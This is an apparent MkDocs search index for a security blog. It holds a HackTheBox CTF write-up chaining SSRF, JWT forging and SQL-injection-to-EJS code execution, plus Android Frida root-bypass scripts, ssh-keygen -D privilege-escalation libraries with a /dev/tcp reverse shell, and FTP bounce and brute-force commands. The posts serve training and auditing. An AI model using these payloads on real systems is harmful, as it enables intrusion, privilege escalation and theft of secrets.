{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Atlansec","text":"<p>Welcome to Material for MkDocs.</p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/","title":"Challenge, Train, Flag: Blueprint Heist","text":"<p>At Atlansec, we are committed to CTFs as a key learning tool under the learning by doing methodology. We believe that facing practical challenges is the best way to develop technical skills and foster creativity. With this section we want to spread the value of CTFs, share writeups of challenges of a certain technical complexity and bring the community closer to a practical and technical approach to learning.</p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#what-is-a-ctf","title":"What is a CTF?","text":"<p>Capture the Flag (CTF) competitions are cybersecurity challenges where participants tackle a variety of technical problems to find \"flags,\" which are hidden markers proving successful completion of a task. CTFs simulate real-world scenarios in areas like cryptography, reverse engineering, web security, forensics, and binary exploitation, helping participants build essential cybersecurity skills.</p> <p>CTFs aren't just competitions; they are a gateway to learning by solving. They teach participants how to think critically, debug complex systems, and adapt under pressure. Each challenge is a story, a puzzle, and a lesson rolled into one.</p> <p>In this series, we'll explore notable CTF challenges, dive into their technical solutions, and highlight the skills they develop. Welcome to Challenge, Train, Flag!</p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#key-concepts","title":"Key concepts","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Technique that allows an attacker to force a server to make HTTP requests on their behalf. Depending on the context, it can be quite critical as it can allow an attacker to access resources within the target's internal network.</p> </li> <li> <p>JSON Web Token (JWT): An open standard for authenticating and securely transferring information using a token.</p> </li> <li> <p>SQL Injection: An attack that allows malicious SQL code to be injected into a query to manipulate the database query.</p> </li> <li> <p>wkhtmltopdf: Library for converting web content (HTML) to PDF.</p> </li> </ul>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#the-challenge","title":"The challenge","text":"<p>This time we bring you a challenge from the HTB Business CTF 2024. The challenge is from the web category and although it is listed as easy on the HackTheBox platform, it is one of the most complex web challenges on the platform due to the number of steps that make up the solution.</p> <p>In this challenge we are given the source code of a NodeJS application and access to a web service running the application.</p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#understanding-the-application-logic","title":"Understanding the Application Logic","text":"<p>The challenge starts with access to an application of the urban planning commission. When browsing, we notice that clicking on any of the links generates a POST request to the /download path. Let's review its implementation in the routes file:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Here we can see that the convertPdf function is responsible for handling the logic of this path. Let's go on to examine its code:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>After reading this, we can see that the function makes sure that the parameter it receives is a valid URL before passing it to the generatePdf function. Let's look at the latter next:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>We note that the generatePdfFromUrl function uses wkhtmltopdf to convert the URL content to a PDF file. This flow opens the door to exploit a SSRF vulnerability in the library.</p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#ssrf-to-local-file-read-on-wkhtmltopdf","title":"SSRF to local file read on wkhtmltopdf","text":"<p>Using an attacker-controlled server, we can serve files on a web server to redirect the visitor to local file system locations, in this case converting the SSRF on the server into a way to read internal files such as /etc/passwd. To do this, we create a PHP file with the following content:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>By passing the URL of our server as a parameter to the /download path, the generated PDF will contain the contents of the /etc/passwd file of the server making the request.</p> <p></p> <p>We then modify the PHP file to exfiltrate the application's .env file:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> <p></p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#jwt-forging","title":"JWT Forging","text":"<p>With the key extracted from the .env file, we can sign valid JWT tokens. We use a tool like JWT.io to generate a token with the administrator role:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n</code></pre> <p></p> <p>Using the token we have generated, we will make a request to the internal admin panel endpoint with the following structure:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>In the generated PDF we can see the contents of the admin panel.  While this generates a screenshot of the admin panel, it only takes us halfway to our ultimate goal.</p> <p></p>"},{"location":"blog/2024/12/08/challenge-train-flag-blueprint-heist/#sql-injection-to-file-upload","title":"SQL injection to file upload","text":"<p>Analysing the rest of the application code, we discovered that the GraphQL endpoint is vulnerable to SQL injection in the getDataByName query. However, a robust regular expression is used to filter out malicious entries:</p> <pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>A more detailed analysis shows that the expression is not multiline, which allows us to bypass it with a line break (<code>n</code>).</p> <ul> <li>No line break.</li> </ul> <p></p> <ul> <li>With a line break.</li> </ul> <p></p> <p>Once this is discovered, we can build a payload for an SQL injection that writes a malicious EJS file to the 404 error path, since the application does not have a path to handle this type of error.</p> <p>The payload we build should be similar to the following, where we include an EJS template that reads the flag by executing the target binary.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>With the malicious file in place, we access a non-existent path to throw a 404 error and execute the /readflag command. This gives us access to the contents of the flag.</p> <p></p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/","title":"Installation and Configuration of Android Studio and Related Tools on Linux/Debian","text":"<p>This article outlines the necessary steps to create a dynamic testing environment on Linux/Debian, detailing how to integrate tools such as Burp Suite, Frida, and Objection, and their specific purposes. It also covers procedures for managing certificates on an Android emulator and configuring a dynamic testing environment. Follow the detailed instructions to achieve a functional and analysis-ready setup.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#installing-android-studio","title":"Installing Android Studio","text":"<p>Android Studio serves as the primary IDE for Android application development and testing, providing an environment for app creation, emulation, and debugging, we are going to use this for easy download and installation of avds.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-download-android-studio","title":"Step 1: Download Android Studio","text":"<ol> <li>Download the Android Studio ZIP file from the official Android Studio page.</li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-extraction-and-setup","title":"Step 2: Extraction and Setup","text":"<p>Extract the downloaded file:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-3-create-symbolic-links","title":"Step 3: Create Symbolic Links","text":"<p>To streamline the use of Android Studio and the emulator, create symbolic links:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Now you can run Android Studio with:</p> <pre><code>androidStudio\n</code></pre> <p>And the emulator with:</p> <pre><code>androidEmulator\n</code></pre>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-4-use-a-physical-device-optional","title":"Step 4: Use a Physical Device (Optional)","text":"<p>Although this guide primarily uses an Android emulator, you can opt to use a physical device for a more realistic experience. This requires enabling developer options and USB debugging on your device.</p> <ol> <li>Enable Developer Options:</li> <li> <p>Go to Settings &gt; About Phone and tap Build Number several times until developer options are enabled.</p> </li> <li> <p>Enable USB Debugging:</p> </li> <li>In Settings &gt; Developer Options, enable USB Debugging.</li> </ol> <p>Connect your device to the computer via USB. You can now use <code>adb</code> commands to install apps, debug, and perform the same tests as with the emulator.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#installing-burp-certificates-on-an-android-emulator","title":"Installing Burp Certificates on an Android Emulator","text":"<p>Burp Suite is used to intercept and analyze traffic between the Android application and backend servers. Installing its certificate allows HTTPS traffic to be decrypted for analysis.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-start-the-emulator-with-a-writable-system","title":"Step 1: Start the Emulator with a Writable System","text":"<ol> <li> <p>List available AVDs (Android Virtual Devices) with the <code>-list-avds</code> option: <pre><code>androidEmulator -list-avds\n</code></pre></p> </li> <li> <p>Start the emulator with the <code>-writable-system</code> option: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-export-the-certificate-from-burp-suite","title":"Step 2: Export the Certificate from Burp Suite","text":"<ol> <li>From Burp Suite, export the certificate in DER format:</li> <li>Go to Proxy &gt; Options &gt; Import/export CA certificate.</li> <li>Export the file as <code>burp-cert.der</code>.</li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-3-convert-and-copy-the-certificate-to-the-emulator","title":"Step 3: Convert and Copy the Certificate to the Emulator","text":"<ol> <li> <p>Convert the certificate from DER to PEM format: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Get the certificate hash: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Rename the certificate using its hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Push the certificate to the emulator: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-4-verification","title":"Step 4: Verification","text":"<p>Restart the emulator and verify the installation by checking Settings -&gt; Security -&gt; Trusted Credentials for the \"PortSwigger CA\" certificate.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#installing-frida-and-objection-in-a-python-virtual-environment","title":"Installing Frida and Objection in a Python Virtual Environment","text":"<p>Frida is a dynamic instrumentation toolkit for debugging, testing, and reverse engineering Android applications. Objection is a wrapper for Frida that simplifies security assessments by automating common testing tasks.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-create-a-virtual-environment","title":"Step 1: Create a Virtual Environment","text":"<ol> <li> <p>Create a Python virtual environment to isolate tool dependencies: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activate the virtual environment: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-install-frida-and-objection","title":"Step 2: Install Frida and Objection","text":"<ol> <li>Install both tools using <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#configuring-frida-server-on-the-emulator","title":"Configuring Frida-Server on the Emulator","text":"<p>The Frida server facilitates communication between the Frida client on your host machine and the Android emulator for live application instrumentation.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-download-the-frida-server-file","title":"Step 1: Download the Frida-Server File","text":"<ol> <li> <p>Download the <code>frida-server</code> binary from the official Frida releases page.</p> </li> <li> <p>Extract the downloaded file.</p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-upload-and-configure-frida-server-on-the-emulator","title":"Step 2: Upload and Configure Frida-Server on the Emulator","text":"<ol> <li> <p>Push the <code>frida-server</code> binary to the emulator: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></p> </li> <li> <p>Start the Frida server: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-3-verification","title":"Step 3: Verification","text":"<p>Ensure Frida is working by listing processes on the emulator:</p> <pre><code>frida-ps -U\n</code></pre>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#method-inspection-revisiting-crackme-1","title":"Method Inspection: Revisiting Crackme 1","text":"<p>To demonstrate the power of dynamic analysis, we will use the \"Uncrackable1\" APK to explore how these techniques can be applied in practice.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#exploring-the-application-with-apklab","title":"Exploring the Application with APKLab","text":"<p>To understand the application better, decompile the APK to reveal its Java source code using the APKLab extension for Visual Studio Code. This extension integrates with tools like JADX to simplify the process.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-set-up-apklab","title":"Step 1: Set up APKLab","text":"<ol> <li>Install APKLab from the Visual Studio Code extensions marketplace.</li> <li>Open the APK file in APKLab to automatically decompile the application and display the code.</li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-locate-root-detection-code","title":"Step 2: Locate Root Detection Code","text":"<ol> <li> <p>Use the search functionality in APKLab to locate code responsible for root detection by searching for phrases like \"Root detected.\"</p> </li> <li> <p>Navigate to the implementation by clicking on the search results.</p> </li> </ol>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<p>We can bypass root detection by modifying what methods like <code>c.a()</code>, <code>c.b()</code>, and <code>c.c()</code> return. Alternatively, we can change the implementation of the <code>onClick()</code> method in <code>MainActivity</code>, which closes the app when \"OK\" is clicked on the alert.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#using-frida-to-instrument-the-app","title":"Using Frida to Instrument the App","text":""},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-1-find-the-process-id","title":"Step 1: Find the Process ID","text":"<p>List all running processes to locate the app:</p> <pre><code>frida-ps -Ua\n</code></pre>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-2-attach-to-the-process-and-enumerate-methods","title":"Step 2: Attach to the Process and Enumerate Methods","text":"<p>Create a script to list methods in the app:</p> <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> <p>Attach to the process and execute the script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#step-3-override-the-method-implementation","title":"Step 3: Override the Method Implementation","text":"<p>Use Frida to modify the <code>onClick()</code> method:</p> <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre> <p>Run the script and verify that pressing \"OK\" no longer closes the app.</p>"},{"location":"blog/2024/12/15/installation-and-configuration-of-analysis-tools-on-android/#extracting-the-secret-passphrase","title":"Extracting the Secret Passphrase","text":"<p>Inspect the code further to find the function responsible for decrypting the secret passphrase. Log the decryption output using Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convert the output byte array to a string using Python to reveal the secret phrase.</p> <p>With this setup, Android Studio enables app emulation and debugging, Burp Suite facilitates traffic interception and analysis, Frida allows dynamic application instrumentation, and Objection automates common security testing tasks. The added dynamic analysis section demonstrates the practical application of these tools in extracting secrets and bypassing protections, making this guide a comprehensive resource for mobile app security testing.</p>"},{"location":"blog/2024/11/17/abusing-ssh-keygen/","title":"Abusing ssh-keygen","text":"<p>SSH-Keygen is a tool that allows you to create and manage SSH keys, this tool is present in most UNIX systems today as a tool to facilitate the management of SSH keys.</p> <p>In this article we will explore some methods to abuse this tool with certain configurations as a method of persistence or privilege escalation on the system.</p> <p>In particular, we will abuse a specific functionality of this binary that allows the loading of public keys from a card reader library, this option is the -D parameter, its use is as follows: </p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>"},{"location":"blog/2024/11/17/abusing-ssh-keygen/#how-to-generate-the-payload","title":"How to generate the payload","text":"<p>Now that we've explained how to use this function, let's look in more detail at how to generate a loadable payload, for which we'll first need to obtain a version of pkcs11.h . This header file is where we define the data types needed for the function of our library that will call ssh-keygen when using the -D parameter. </p> <p>In our case, we will go to the Open Smart Card repository and download the version we need from the following URL</p> <p>Github Code </p> <p>With this file we will proceed to write a small program in C with the necessary structure to be executed by ssh-keygen, in our case this program will spawn a bash shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled we can load it as a library as indicated in the introduction. </p>"},{"location":"blog/2024/11/17/abusing-ssh-keygen/#profit","title":"Profit","text":""},{"location":"blog/2024/11/17/abusing-ssh-keygen/#case-1-sudo-ssh-keygen","title":"Case 1: Sudo SSH-Keygen","text":"<p>Let's take advantage of a scenario where our user has permissions to execute the ssh-keygen command as root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>In this case, instead of using a simple bash call, we will load a reverse shell.</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-c\u2019 , \u2018bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>As a result, when we load it, we will get a root connection in our listener, we could modify it to run a shell simply as in the example in the theory section </p>"},{"location":"blog/2024/11/17/abusing-ssh-keygen/#case-2-ssh-keygen-suid","title":"Case 2: SSH Keygen SUID","text":"<p>In this scenario we are going to exploit a slightly less common scenario where ssh-keygen has the SUID bit set, in this case to keep the SUID privileges we need to change the library code a bit so that the shell keeps the privileges</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-p\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled, we can run the command to load the library and get a shell with the necessary privileges.</p>"},{"location":"blog/2024/11/17/abusing-ssh-keygen/#final-thoughts","title":"Final Thoughts","text":"<p>As demonstrated, ssh-keygen is a powerful tool that, when misconfigured or misused, can become a significant security risk. The scenarios presented in this article highlight the importance of properly configuring and restricting access to binaries with elevated privileges.</p> <p>By understanding and proactively managing the capabilities and risks associated with common tools like ssh-keygen, administrators can ensure the integrity and security of their systems. </p> <p>Note</p> <p>Always adopt the principle of least privilege and conduct regular security audits to minimize attack surfaces.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/","title":"Intro to FTP","text":"<p>FTP (File Transfer Protocol) is a protocol used for transferring files between computers on a network, this protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, the information is transmitted in plain text, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p> <p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#theory","title":"Theory","text":""},{"location":"blog/2024/07/24/intro-to-ftp/#communication-channels","title":"Communication channels","text":"<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#connection-modes","title":"Connection modes","text":""},{"location":"blog/2024/07/24/intro-to-ftp/#active","title":"Active","text":"<p>This is the default connection mode for FTP connections, in which two events occur:</p> <ul> <li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li> </ul> <p>Note</p> <p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#passive","title":"Passive","text":"<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p> <ul> <li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li> </ul> <p>Note</p> <p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#ftp-commands","title":"FTP commands","text":"<pre><code>CWD -&gt; Changes the current directory to the specified one\nDELE -&gt; Deletes the specified file\nEPRT -&gt; Establish a socket for data connection\nLIST -&gt; List the files in the current directory\nPASV -&gt; Change mode to passive mode\nPWD -&gt; Displays the current directory \nRETR -&gt; Download the specified file\n</code></pre>"},{"location":"blog/2024/07/24/intro-to-ftp/#anonymous-login","title":"Anonymous login","text":"<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#nmap","title":"Nmap","text":"<pre><code>nmap -b &lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt; &lt;victim&gt;\n</code></pre>"},{"location":"blog/2024/07/24/intro-to-ftp/#hand-made","title":"Hand-made","text":"<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p> <p>Here is an example for scanning port 9091 on host 10.10.10.14</p> <pre><code>PORT 10.10.10.14.14.0.9091\nEPRT |2|10.10.10.14|9091||\n\nLIST\n</code></pre> <p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p> <p></p> <p>This attack has the following prerequisites:</p> <ul> <li>Valid credentials for External FTP.</li> <li>Valid credentials for Internal FTP.</li> <li>Write access for External FTP.</li> <li>PORT command execution permissions on both External and Internal.</li> </ul> <p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p> <p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p> <p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p> <pre><code>user ftp # User for the internal server\npass password # Password for the internal server\ncwd /DIRECTORY\ntype i\nport F,F,F,F,F,F,X,X #Our passive port\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Now we upload it with PUT and from the external server we execute the following commands:</p> <pre><code>put payload\nquote \"port C,C,C,C,C,0,21\" # IP of internal server\nquote \"retr payload\"\n</code></pre> <p>After this we will have the file.ext file on our server as output.ext</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#brute-force-attack","title":"Brute force attack","text":"<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>"},{"location":"blog/2024/07/24/intro-to-ftp/#netexec","title":"NetExec","text":"<pre><code>nxc ftp IP -u userfile -p passwordfile\n</code></pre>"},{"location":"blog/2024/07/24/intro-to-ftp/#hydra","title":"Hydra","text":"<pre><code>hydra -L userfile -P passwordfile ftp://IP\n</code></pre>"},{"location":"blog/2024/07/24/intro-to-ftp/#surprise-backup","title":"Surprise backup","text":"<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>"},{"location":"blog/2024/07/24/intro-to-ftp/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p> <p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>"},{"location":"blog/2024/07/24/intro-to-ftp/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p> <p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/2024/11/24/smb-101/","title":"SMB 101","text":"<p>SMB (Server Message Block) is a protocol used to share resources such as files, printers, and directories over a network. It uses a client-server architecture, where the server makes resources available, and multiple clients can access them. Although SMB3 introduces encryption to protect data, earlier versions like SMB1 transmit information in plain text, making it vulnerable to certain attacks.</p> <p>In this article, we will focus on basic concepts, key commands, and common attacks related to SMB, highlighting the use of tools like enum4linux for enumeration.</p>"},{"location":"blog/2024/11/24/smb-101/#theory","title":"Theory","text":""},{"location":"blog/2024/11/24/smb-101/#ports-used-by-smb","title":"Ports Used by SMB","text":"<p>SMB primarily operates on the following ports:</p> <ul> <li>445/TCP: Used by modern SMB for direct connections without NetBIOS.</li> <li>139/TCP: Used by older versions relying on NetBIOS.</li> </ul>"},{"location":"blog/2024/11/24/smb-101/#authentication-in-smb","title":"Authentication in SMB","text":"<p>SMB employs several authentication mechanisms:</p> <ul> <li>NTLM (LAN Manager): Vulnerable to relay and brute-force attacks.</li> <li>Kerberos: More secure, used in environments with Active Directory.</li> </ul>"},{"location":"blog/2024/11/24/smb-101/#enumeration-with-smb","title":"Enumeration with SMB","text":"<p>Enumeration is the initial step to gather information about shared resources, users, and the SMB server configuration. Here are some common tools for this purpose:</p>"},{"location":"blog/2024/11/24/smb-101/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux is an enumeration tool specifically designed for SMB. It allows identifying shared resources, password policies, and users on Windows systems.</p> <p>Common Commands:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Specific Modes:</p> <ul> <li>Enumerate users:</li> </ul> <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre> <ul> <li>Enumerate shared resources:</li> </ul> <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre> <ul> <li>Enumerate domain information:</li> </ul> <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre> <p>Typical Outputs:</p> <ul> <li>Available shared resources.</li> <li>System users.</li> <li>Password policies, such as expiration and minimum length.</li> </ul>"},{"location":"blog/2024/11/24/smb-101/#smbclient","title":"SMBClient","text":"<p>SMBClient is a tool integrated into Linux systems for interacting directly with SMB resources.</p> <p>Example Usage:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\n</code></pre> <p>After connecting, you can list, download, and upload files with FTP-like commands:</p> 